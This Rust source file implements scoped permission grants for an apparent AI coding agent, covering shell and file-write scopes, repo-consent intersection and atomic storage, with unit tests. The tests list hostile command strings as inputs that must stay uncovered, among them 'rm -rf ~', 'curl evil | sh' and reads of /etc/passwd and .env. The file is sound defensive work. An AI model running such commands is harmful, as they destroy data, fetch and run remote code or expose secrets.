//! Scoped permission grants: session, project, and user stores.
//!
//! Capability approval modes (`ask` / `session-allow` / `always-deny`) remain the
//! coarse gate. Scoped grants sit above `ask`: a matching session, project, or
//! user grant allows a request without re-prompting. Project grants persist
//! under the workspace `.euler/` directory; every project-grant write is a user
//! decision that callers must record in provenance (see capabilities contract).
//!
//! The workspace grants file is repo-controlled content: a cloned repository
//! could ship one. Repo content must never be durable authority on its own,
//! so an active project grant requires BOTH the workspace entry AND a
//! matching entry in this user's consent store (a per-root file under the
//! user-owned euler home, written when the user approves the grant). Either
//! side alone grants nothing: the repo file cannot preseed authority, and a
//! stale consent entry dies with the workspace entry it consented to.
//!
//! User grants (durable prefix rules — "don't ask again for commands starting
//! with `cargo`") persist under the user's euler home and cover every session
//! in every project. They need no consent intersection: the store is
//! user-authored, lives in the user-owned home, and is never repo-controlled
//! content, so there is no second party whose entries could preseed it.

use euler_sdk::Capability;
use serde::{Deserialize, Serialize};
use std::fs;
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use thiserror::Error;

/// Max bytes for a scope pattern (command token or directory prefix).
pub const MAX_SCOPE_PATTERN_BYTES: usize = 256;
/// Max bytes retained on [`crate::permissions::PermissionRequest::command`].
pub const MAX_GRANT_COMMAND_BYTES: usize = 4 * 1024;
/// Max bytes retained on deny-with-instruction text.
pub const MAX_GRANT_INSTRUCTION_BYTES: usize = 4 * 1024;
/// Max bytes for the project grants file.
const MAX_GRANTS_FILE_BYTES: u64 = 64 * 1024;

const GRANTS_FILE: &str = "grants.json";
const USER_GRANTS_FILE: &str = "user-grants.json";
const EULER_DIR: &str = ".euler";
const GRANTS_VERSION: u64 = 1;

/// Opaque bounded pattern for a scoped grant.
///
/// Empty means **unscoped**: the whole capability (legacy `AllowSession`).
/// For `shell-exec`, non-empty is the command first token (`cargo`, `git`).
/// For `fs-write`, non-empty is a workspace-relative directory prefix (typically
/// the path's top-level component). Derivation of the pattern from a live
/// request is a caller concern; this type only stores and matches.
#[derive(Clone, Debug, Eq, PartialEq, Hash, Ord, PartialOrd, Serialize, Deserialize)]
pub struct ScopePattern(String);

impl ScopePattern {
    /// Unscoped pattern: matches any request for the capability.
    pub fn unscoped() -> Self {
        Self(String::new())
    }

    /// Build a pattern, rejecting oversize or control-bearing strings.
    pub fn new(raw: impl Into<String>) -> Result<Self, ScopePatternError> {
        let raw = raw.into();
        validate_pattern(&raw)?;
        Ok(Self(raw))
    }

    pub fn is_unscoped(&self) -> bool {
        self.0.is_empty()
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl AsRef<str> for ScopePattern {
    fn as_ref(&self) -> &str {
        self.as_str()
    }
}

#[derive(Clone, Debug, Eq, PartialEq, Error)]
pub enum ScopePatternError {
    #[error("scope pattern exceeds {MAX_SCOPE_PATTERN_BYTES} bytes")]
    TooLarge,
    #[error("scope pattern contains control characters")]
    ControlChars,
}

fn validate_pattern(raw: &str) -> Result<(), ScopePatternError> {
    if raw.len() > MAX_SCOPE_PATTERN_BYTES {
        return Err(ScopePatternError::TooLarge);
    }
    if raw.chars().any(|c| c.is_control()) {
        return Err(ScopePatternError::ControlChars);
    }
    Ok(())
}

/// How long a grant lasts and which pattern it covers.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum GrantScope {
    /// Allow this request only; do not retain a grant.
    Once,
    /// Retain for the current session under `ScopePattern`.
    Session(ScopePattern),
    /// Persist under the project grants file under `ScopePattern`.
    Project(ScopePattern),
    /// Persist under the user-home grants file under `ScopePattern` —
    /// covers every session in every project ("always").
    User(ScopePattern),
}

impl GrantScope {
    pub fn pattern(&self) -> Option<&ScopePattern> {
        match self {
            Self::Once => None,
            Self::Session(p) | Self::Project(p) | Self::User(p) => Some(p),
        }
    }

    /// Wire label for permission.decision payloads:
    /// `once` | `session` | `project` | `user`.
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Once => "once",
            Self::Session(_) => "session",
            Self::Project(_) => "project",
            Self::User(_) => "user",
        }
    }
}

/// One active grant entry (session memory or project file).
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct ActiveGrant {
    pub capability: Capability,
    pub pattern: ScopePattern,
}

impl ActiveGrant {
    pub fn new(capability: Capability, pattern: ScopePattern) -> Self {
        Self {
            capability,
            pattern,
        }
    }

    pub fn unscoped(capability: Capability) -> Self {
        Self::new(capability, ScopePattern::unscoped())
    }

    /// Whether this grant covers `capability` under the request context.
    /// `workspace_root` is the shell execution cwd for segment-safety
    /// composition; `None` disables the statically-safe escape hatch, so
    /// every segment must be token-granted (fail closed).
    pub fn matches(
        &self,
        capability: Capability,
        command: Option<&str>,
        path: Option<&Path>,
        workspace_root: Option<&Path>,
    ) -> bool {
        if self.capability != capability {
            return false;
        }
        if self.pattern.is_unscoped() {
            return true;
        }
        match capability {
            Capability::ShellExec => command.is_some_and(|command| {
                shell_segments_covered(command, workspace_root, |token| {
                    token == self.pattern.as_str()
                })
            }),
            Capability::FsWrite => {
                path.is_some_and(|p| path_under_prefix(p, self.pattern.as_str()))
            }
            // Patterned grants for other capabilities are exact unscoped-only
            // until those capabilities gain structured scope fields.
            _ => false,
        }
    }
}

/// Segment-aware scoped-shell coverage (issue #78). Execution is
/// `sh -c <command>`, so a first-token grant must never authorize an
/// unrelated command hiding behind a separator (`cargo test; rm -rf ~`).
/// A command is covered iff it parses into plain segments
/// ([`crate::command_safety::parse_plain_segments`]) and EVERY segment
/// either has a granted first token or is statically safe — with at least
/// one segment actually matching a granted token, so an all-safe command
/// is attributed to the static-safe path, never to an unrelated grant.
/// Unparseable commands (redirects, substitution, subshells, …) are never
/// covered and fall back to the ask path.
///
/// Static safety includes workspace confinement, so it needs the execution
/// cwd: without a `workspace_root`, ungranted segments are never safe and
/// coverage requires every segment's token to be granted (fail closed).
fn shell_segments_covered(
    command: &str,
    workspace_root: Option<&Path>,
    token_granted: impl Fn(&str) -> bool,
) -> bool {
    let Some(segments) = crate::command_safety::parse_plain_segments(command) else {
        return false;
    };
    let mut any_token_granted = false;
    for segment in &segments {
        if token_granted(segment.first_token()) {
            any_token_granted = true;
        } else if !workspace_root.is_some_and(|root| segment.is_statically_safe(root)) {
            return false;
        }
    }
    any_token_granted
}

/// First whitespace-delimited token of a shell command line. Grant COVERAGE
/// is segment-aware ([`shell_segments_covered`]); this whole-line helper
/// remains for surfaces that derive a display/offer prefix from a single
/// simple invocation (the durable user-rule offering).
pub fn command_first_token(command: &str) -> Option<&str> {
    let token = command.split_whitespace().next()?;
    if token.is_empty() {
        None
    } else {
        Some(token)
    }
}

/// Whether a command line is a single simple invocation — no shell control
/// operators, substitution, or redirection anywhere in the line.
/// Conservative by design: quoting is not parsed, so a quoted metacharacter
/// also reads as non-simple. Grant COVERAGE no longer uses this (it is
/// segment-aware, see [`shell_segments_covered`]); it gates surfaces that
/// must stay narrower than coverage, such as offering a durable user rule
/// only from a single simple invocation.
pub fn shell_command_is_simple(command: &str) -> bool {
    const SHELL_CONTROL_CHARS: &[char] = &[
        ';', '|', '&', '$', '`', '>', '<', '(', ')', '{', '}', '\n', '\r',
    ];
    !command.contains(SHELL_CONTROL_CHARS)
}

/// Workspace-relative path is the prefix itself or a descendant.
///
/// Matching is lexical, so callers must resolve the request path (`..`,
/// symlinks) against the workspace before matching — see the session's
/// covered-grant path. As defense in depth, a path that still carries a
/// parent-dir component never matches a scoped prefix (fail closed to ask).
pub fn path_under_prefix(path: &Path, prefix: &str) -> bool {
    if prefix.is_empty() {
        return true;
    }
    if path
        .components()
        .any(|component| matches!(component, std::path::Component::ParentDir))
    {
        return false;
    }
    let path = path_as_relative_str(path);
    path == prefix || path.starts_with(&format!("{prefix}/"))
}

fn path_as_relative_str(path: &Path) -> String {
    path.to_string_lossy()
        .trim_start_matches("./")
        .replace('\\', "/")
}

/// Bound a command string for request enrichment.
pub fn bound_command(command: &str) -> Option<String> {
    let trimmed = command.trim();
    if trimmed.is_empty() {
        return None;
    }
    Some(bound_utf8(trimmed, MAX_GRANT_COMMAND_BYTES))
}

/// Bound deny-instruction text.
pub fn bound_instruction(text: &str) -> Option<String> {
    let trimmed = text.trim();
    if trimmed.is_empty() {
        return None;
    }
    Some(bound_utf8(trimmed, MAX_GRANT_INSTRUCTION_BYTES))
}

fn bound_utf8(text: &str, max_bytes: usize) -> String {
    if text.len() <= max_bytes {
        return text.to_owned();
    }
    let mut end = max_bytes;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    text[..end].to_owned()
}

/// In-memory grant list with membership and revoke helpers.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct GrantList {
    grants: Vec<ActiveGrant>,
}

impl GrantList {
    pub fn new() -> Self {
        Self::default()
    }

    pub fn from_vec(grants: Vec<ActiveGrant>) -> Self {
        Self { grants }
    }

    pub fn as_slice(&self) -> &[ActiveGrant] {
        &self.grants
    }

    pub fn iter(&self) -> impl Iterator<Item = &ActiveGrant> {
        self.grants.iter()
    }

    pub fn is_granted(
        &self,
        capability: Capability,
        command: Option<&str>,
        path: Option<&Path>,
        workspace_root: Option<&Path>,
    ) -> bool {
        if self
            .grants
            .iter()
            .any(|g| g.capability == capability && g.pattern.is_unscoped())
        {
            return true;
        }
        // Segment-aware shell coverage pools every scoped token in THIS
        // list, so `cargo test && npm run lint` is covered by cargo + npm
        // grants living in the same store. Session and project stores are
        // consulted separately by the gate: a compound command whose
        // segments straddle the two stores falls back to ask (the ledger's
        // single grant_source tag must stay honest).
        if capability == Capability::ShellExec {
            return command.is_some_and(|command| {
                shell_segments_covered(command, workspace_root, |token| {
                    self.grants.iter().any(|g| {
                        g.capability == Capability::ShellExec
                            && !g.pattern.is_unscoped()
                            && g.pattern.as_str() == token
                    })
                })
            });
        }
        self.grants
            .iter()
            .any(|g| g.matches(capability, command, path, workspace_root))
    }

    pub fn insert(&mut self, grant: ActiveGrant) {
        if !self.grants.iter().any(|g| g == &grant) {
            self.grants.push(grant);
        }
    }

    /// Remove grants matching capability + pattern. Returns how many were removed.
    pub fn revoke(&mut self, capability: Capability, pattern: &ScopePattern) -> usize {
        let before = self.grants.len();
        self.grants
            .retain(|g| !(g.capability == capability && g.pattern == *pattern));
        before - self.grants.len()
    }

    pub fn clear(&mut self) {
        self.grants.clear();
    }

    /// Entries present in BOTH lists (workspace file ∩ user consent store) —
    /// the only project grants that are ever active.
    pub fn intersection(&self, other: &GrantList) -> GrantList {
        GrantList {
            grants: self
                .grants
                .iter()
                .filter(|grant| other.grants.contains(grant))
                .cloned()
                .collect(),
        }
    }
}

/// Project-local grants file under `<root>/.euler/grants.json`.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct ProjectGrantStore {
    path: PathBuf,
}

impl ProjectGrantStore {
    pub fn for_root(root: impl Into<PathBuf>) -> Self {
        let root = root.into();
        Self {
            path: root.join(EULER_DIR).join(GRANTS_FILE),
        }
    }

    /// Store at an explicit file path (used for the user-home consent store
    /// and the user-level durable grants store).
    pub fn at_path(path: impl Into<PathBuf>) -> Self {
        Self { path: path.into() }
    }

    /// User-level durable grants file under the euler home:
    /// `<home>/user-grants.json`.
    ///
    /// Unlike the workspace grants file, this store needs no consent
    /// intersection: it is user-authored, lives in the user-owned euler home,
    /// and is never repo-controlled content — there is no second party whose
    /// entries could preseed authority. Writes use the same atomic-rename +
    /// 0600 discipline as every other grant store.
    pub fn user_grants_path(user_dir: &Path) -> PathBuf {
        user_dir.join(USER_GRANTS_FILE)
    }

    /// User-consent store path for a workspace root: one file per root under
    /// `<consent_dir>/project-grants/`, keyed by the canonicalized root so a
    /// moved or differently-spelled path cannot borrow another root's consent.
    pub fn consent_path_for_root(consent_dir: &Path, root: &Path) -> PathBuf {
        use sha2::{Digest, Sha256};
        let canonical = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
        let mut hasher = Sha256::new();
        hasher.update(canonical.to_string_lossy().as_bytes());
        let digest = hasher.finalize();
        let mut name = String::with_capacity(64);
        for byte in digest {
            use std::fmt::Write as _;
            let _ = write!(name, "{byte:02x}");
        }
        consent_dir
            .join("project-grants")
            .join(format!("{name}.json"))
    }

    pub fn path(&self) -> &Path {
        &self.path
    }

    pub fn load(&self) -> Result<GrantList, ProjectGrantError> {
        let content = match fs::read_to_string(&self.path) {
            Ok(content) => content,
            Err(error) if error.kind() == io::ErrorKind::NotFound => {
                return Ok(GrantList::new());
            }
            Err(source) => {
                return Err(ProjectGrantError::Io {
                    path: self.path.clone(),
                    source,
                });
            }
        };
        if content.len() as u64 > MAX_GRANTS_FILE_BYTES {
            return Err(ProjectGrantError::TooLarge {
                path: self.path.clone(),
                bytes: content.len() as u64,
            });
        }
        let doc: GrantsFile =
            serde_json::from_str(&content).map_err(|source| ProjectGrantError::Invalid {
                path: self.path.clone(),
                source,
            })?;
        if doc.version != GRANTS_VERSION {
            return Err(ProjectGrantError::UnsupportedVersion {
                path: self.path.clone(),
                version: doc.version,
            });
        }
        let mut list = GrantList::new();
        for entry in doc.grants {
            let capability = Capability::parse(&entry.capability).ok_or_else(|| {
                ProjectGrantError::UnknownCapability {
                    path: self.path.clone(),
                    capability: entry.capability,
                }
            })?;
            let pattern = ScopePattern::new(entry.pattern).map_err(|source| {
                ProjectGrantError::BadPattern {
                    path: self.path.clone(),
                    source,
                }
            })?;
            list.insert(ActiveGrant::new(capability, pattern));
        }
        Ok(list)
    }

    pub fn save(&self, grants: &GrantList) -> Result<(), ProjectGrantError> {
        let dir = self.path.parent().ok_or_else(|| ProjectGrantError::Io {
            path: self.path.clone(),
            source: io::Error::new(io::ErrorKind::InvalidInput, "grants path has no parent"),
        })?;
        fs::create_dir_all(dir).map_err(|source| ProjectGrantError::Io {
            path: dir.to_path_buf(),
            source,
        })?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = fs::set_permissions(dir, fs::Permissions::from_mode(0o700));
        }
        let doc = GrantsFile {
            version: GRANTS_VERSION,
            grants: grants
                .iter()
                .map(|g| GrantFileEntry {
                    capability: g.capability.as_str().to_owned(),
                    pattern: g.pattern.as_str().to_owned(),
                })
                .collect(),
        };
        let bytes =
            serde_json::to_vec_pretty(&doc).map_err(|source| ProjectGrantError::Serialize {
                path: self.path.clone(),
                source,
            })?;
        write_atomic(&self.path, &bytes)
    }

    pub fn add(&self, grant: &ActiveGrant) -> Result<GrantList, ProjectGrantError> {
        let mut list = self.load()?;
        list.insert(grant.clone());
        self.save(&list)?;
        Ok(list)
    }

    pub fn revoke(
        &self,
        capability: Capability,
        pattern: &ScopePattern,
    ) -> Result<GrantList, ProjectGrantError> {
        let mut list = self.load()?;
        list.revoke(capability, pattern);
        self.save(&list)?;
        Ok(list)
    }
}

#[derive(Debug, Serialize, Deserialize)]
struct GrantsFile {
    version: u64,
    #[serde(default)]
    grants: Vec<GrantFileEntry>,
}

#[derive(Debug, Serialize, Deserialize)]
struct GrantFileEntry {
    capability: String,
    #[serde(default)]
    pattern: String,
}

#[derive(Debug, Error)]
pub enum ProjectGrantError {
    #[error("project grant store is not loaded; call load_project_grants first")]
    NoStore,
    #[error("project grants file too large at {}: {bytes} bytes", path.display())]
    TooLarge { path: PathBuf, bytes: u64 },
    #[error("unsupported project grants version {version} at {}", path.display())]
    UnsupportedVersion { path: PathBuf, version: u64 },
    #[error("unknown capability `{capability}` in {}", path.display())]
    UnknownCapability { path: PathBuf, capability: String },
    #[error("invalid scope pattern in {}: {source}", path.display())]
    BadPattern {
        path: PathBuf,
        #[source]
        source: ScopePatternError,
    },
    #[error("invalid project grants file {}: {source}", path.display())]
    Invalid {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },
    #[error("failed to serialize project grants at {}: {source}", path.display())]
    Serialize {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },
    #[error("project grants I/O at {}: {source}", path.display())]
    Io {
        path: PathBuf,
        #[source]
        source: io::Error,
    },
}

fn write_atomic(path: &Path, bytes: &[u8]) -> Result<(), ProjectGrantError> {
    let dir = path.parent().unwrap_or_else(|| Path::new("."));
    let temp_path = dir.join(format!(
        ".{}.{}.tmp",
        path.file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("grants.json"),
        ulid::Ulid::new()
    ));
    {
        let mut options = fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut file = options
            .open(&temp_path)
            .map_err(|source| ProjectGrantError::Io {
                path: temp_path.clone(),
                source,
            })?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = file.set_permissions(fs::Permissions::from_mode(0o600));
        }
        file.write_all(bytes)
            .map_err(|source| ProjectGrantError::Io {
                path: temp_path.clone(),
                source,
            })?;
        file.flush().map_err(|source| ProjectGrantError::Io {
            path: temp_path.clone(),
            source,
        })?;
        crate::durability::sync_file_data(&file, &temp_path).map_err(|source| {
            ProjectGrantError::Io {
                path: temp_path.clone(),
                source,
            }
        })?;
    }
    fs::rename(&temp_path, path).map_err(|source| ProjectGrantError::Io {
        path: path.to_path_buf(),
        source,
    })?;
    crate::durability::sync_dir(dir).map_err(|source| ProjectGrantError::Io {
        path: dir.to_path_buf(),
        source,
    })?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn unscoped_matches_any_context() {
        let grant = ActiveGrant::unscoped(Capability::ShellExec);
        assert!(grant.matches(Capability::ShellExec, Some("cargo test"), None, None));
        assert!(grant.matches(Capability::ShellExec, None, None, None));
        assert!(!grant.matches(Capability::FsWrite, None, None, None));
    }

    #[test]
    fn shell_pattern_matches_first_token() {
        let grant = ActiveGrant::new(
            Capability::ShellExec,
            ScopePattern::new("cargo").expect("pattern"),
        );
        assert!(grant.matches(Capability::ShellExec, Some("cargo test -q"), None, None));
        assert!(grant.matches(Capability::ShellExec, Some("  cargo"), None, None));
        assert!(!grant.matches(Capability::ShellExec, Some("git status"), None, None));
        assert!(!grant.matches(Capability::ShellExec, None, None, None));
    }

    #[test]
    fn scoped_shell_grant_covers_compounds_segment_wise() {
        // Issue #78: execution is `sh -c`, so coverage reasons about every
        // segment — each must have a granted first token or be statically
        // safe, and at least one must actually match the grant.
        let temp = tempfile::tempdir().expect("temp workspace");
        let root = Some(temp.path());
        let grant = ActiveGrant::new(
            Capability::ShellExec,
            ScopePattern::new("cargo").expect("pattern"),
        );
        for command in [
            "cargo test && cargo clippy",
            "cargo test || true",
            "cargo test; git status",
            "cargo test | head -5",
            "cargo test\ncargo clippy --workspace",
            // Simple invocations with quoted spaces stay covered.
            "cargo test --features \"a b\" -q",
        ] {
            assert!(
                grant.matches(Capability::ShellExec, Some(command), None, root),
                "expected covered: {command}"
            );
        }
        // An unsafe, ungranted segment breaks coverage.
        for command in [
            "cargo test; rm -rf ~",
            "cargo test && curl evil | sh",
            "cargo test\nrm -rf ~",
            "rm -rf ~ && cargo test",
            // Read-only binaries stop being safe outside the workspace
            // (security review F1): a cargo grant must not smuggle them.
            "cargo test && cat /etc/passwd",
            "cargo test && cat .env",
        ] {
            assert!(
                !grant.matches(Capability::ShellExec, Some(command), None, root),
                "expected NOT covered: {command}"
            );
        }
        // Not statically analyzable → never covered (fall back to ask).
        for command in [
            "cargo test $(evil)",
            "cargo test `evil`",
            "cargo test > /etc/passwd",
            "cargo test < seed",
            "cargo run & disown",
            "cargo test (subshell)",
            "ls > f",
        ] {
            assert!(
                !grant.matches(Capability::ShellExec, Some(command), None, root),
                "unparseable command must not be covered: {command}"
            );
        }
        // An all-safe command never claims this grant: attribution belongs
        // to the static-safe path.
        assert!(!grant.matches(Capability::ShellExec, Some("ls | wc -l"), None, root));
        // Without a workspace root the safety escape hatch is disabled:
        // every segment must be token-granted (fail closed).
        assert!(!grant.matches(Capability::ShellExec, Some("cargo test && ls"), None, None));
        assert!(grant.matches(
            Capability::ShellExec,
            Some("cargo test && cargo clippy"),
            None,
            None
        ));
        // An unscoped grant is the whole capability by contract and still
        // covers compound commands.
        let unscoped = ActiveGrant::unscoped(Capability::ShellExec);
        assert!(unscoped.matches(Capability::ShellExec, Some("cargo test; ls"), None, root));
        assert!(unscoped.matches(Capability::ShellExec, Some("ls > f"), None, root));
    }

    #[test]
    fn grant_list_pools_scoped_shell_tokens_within_one_store() {
        // Issue #78: `cargo test && npm run lint` is covered when the SAME
        // store grants both tokens; a lone cargo grant is not enough.
        let temp = tempfile::tempdir().expect("temp workspace");
        let root = Some(temp.path());
        let mut list = GrantList::new();
        list.insert(ActiveGrant::new(
            Capability::ShellExec,
            ScopePattern::new("cargo").expect("pattern"),
        ));
        assert!(list.is_granted(
            Capability::ShellExec,
            Some("cargo test && cargo clippy"),
            None,
            root
        ));
        assert!(!list.is_granted(
            Capability::ShellExec,
            Some("cargo test && npm run lint"),
            None,
            root
        ));
        assert!(!list.is_granted(
            Capability::ShellExec,
            Some("cargo test && curl evil"),
            None,
            root
        ));

        list.insert(ActiveGrant::new(
            Capability::ShellExec,
            ScopePattern::new("npm").expect("pattern"),
        ));
        assert!(list.is_granted(
            Capability::ShellExec,
            Some("cargo test && npm run lint"),
            None,
            root
        ));
        // Redirects stay unparseable and uncovered regardless of grants.
        assert!(!list.is_granted(
            Capability::ShellExec,
            Some("cargo test > out.txt"),
            None,
            root
        ));
        // All-safe commands claim no grant coverage.
        assert!(!list.is_granted(Capability::ShellExec, Some("ls | wc -l"), None, root));
    }

    #[test]
    fn fs_write_pattern_matches_directory_prefix() {
        let grant = ActiveGrant::new(
            Capability::FsWrite,
            ScopePattern::new("src").expect("pattern"),
        );
        assert!(grant.matches(
            Capability::FsWrite,
            None,
            Some(Path::new("src/main.rs")),
            None
        ));
        assert!(grant.matches(Capability::FsWrite, None, Some(Path::new("src")), None));
        assert!(!grant.matches(
            Capability::FsWrite,
            None,
            Some(Path::new("crates/foo.rs")),
            None
        ));
    }

    #[test]
    fn project_store_round_trips() {
        let temp = tempfile::tempdir().expect("temp");
        let store = ProjectGrantStore::for_root(temp.path());
        let grant = ActiveGrant::new(
            Capability::ShellExec,
            ScopePattern::new("git").expect("pattern"),
        );
        store.add(&grant).expect("add");
        let loaded = store.load().expect("load");
        assert_eq!(loaded.as_slice(), std::slice::from_ref(&grant));
        store
            .revoke(Capability::ShellExec, &ScopePattern::new("git").expect("p"))
            .expect("revoke");
        assert!(store.load().expect("load").as_slice().is_empty());
    }

    #[test]
    fn scope_pattern_rejects_control_and_oversize() {
        assert!(ScopePattern::new("a\nb").is_err());
        assert!(ScopePattern::new("x".repeat(MAX_SCOPE_PATTERN_BYTES + 1)).is_err());
        assert!(ScopePattern::new("x".repeat(MAX_SCOPE_PATTERN_BYTES)).is_ok());
    }

    #[test]
    fn grant_list_dedupes_and_revokes() {
        let mut list = GrantList::new();
        let g = ActiveGrant::new(
            Capability::FsWrite,
            ScopePattern::new("docs").expect("pattern"),
        );
        list.insert(g.clone());
        list.insert(g.clone());
        assert_eq!(list.as_slice().len(), 1);
        assert_eq!(list.revoke(Capability::FsWrite, &g.pattern), 1);
        assert!(list.as_slice().is_empty());
    }

    #[test]
    fn save_surfaces_injected_sync_failures_and_keeps_previous_grants() {
        use crate::durability::fault::{arm_matching, Op};

        let temp = tempfile::tempdir().expect("temp");
        let store = ProjectGrantStore::at_path(temp.path().join("grants.json"));
        let mut first = GrantList::new();
        first.insert(ActiveGrant::unscoped(Capability::ShellExec));
        store.save(&first).expect("initial save");

        // Temp-file sync failure happens before the rename, so the previous
        // grants file must remain intact and loadable.
        let mut second = first.clone();
        second.insert(ActiveGrant::unscoped(Capability::FsWrite));
        {
            let guard = arm_matching(Op::FileSync, |path| {
                path.extension().is_some_and(|extension| extension == "tmp")
            });
            let error = store.save(&second).expect_err("temp-file sync failure");
            assert!(matches!(error, ProjectGrantError::Io { .. }));
            assert!(guard.fired());
        }
        assert_eq!(store.load().expect("load after temp sync failure"), first);

        // Directory-sync failure (the swallowed-fsync class fixed in PR
        // #194): the error must propagate, and the file stays loadable.
        {
            let dir = temp.path().to_path_buf();
            let guard = arm_matching(Op::DirSync, move |path| path == dir);
            let error = store.save(&second).expect_err("dir sync failure");
            assert!(matches!(error, ProjectGrantError::Io { .. }));
            assert!(guard.fired());
        }
        assert_eq!(store.load().expect("load after dir sync failure"), second);
    }
}
